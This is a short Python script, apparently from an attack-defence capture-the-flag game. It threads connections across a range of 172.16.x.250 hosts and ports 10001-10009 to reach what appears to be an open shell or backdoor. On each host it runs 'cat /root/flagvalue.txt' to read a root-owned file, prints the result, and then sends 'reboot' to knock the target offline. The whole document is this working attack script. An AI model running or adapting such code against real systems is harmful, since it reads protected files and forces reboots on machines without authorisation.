import socket
import threading
def payload(ip,port):
    try:
        max_port=port
        x=1
        while True:
            max_socket=socket.socket()
            try:
                max_socket.connect((ip,port))
                break
            except:
                if x==9:
                    port=max_port
                    x=1
                else:
                    port+=1
                    x+=1
        max_socket.send('cat /root/flagvalue.txt\n'.encode())
        a=max_socket.recv(1024).decode()
        max_socket.send('reboot\n'.encode())
        print(ip,a)
    except:
        pass

if __name__=='__main__':
    port=10001
    for i in range(100,115):
        ip='172.16.'+str(i)+'.250'
        max_thread=threading.Thread(target=payload,args=(ip,port))
        max_thread.start()



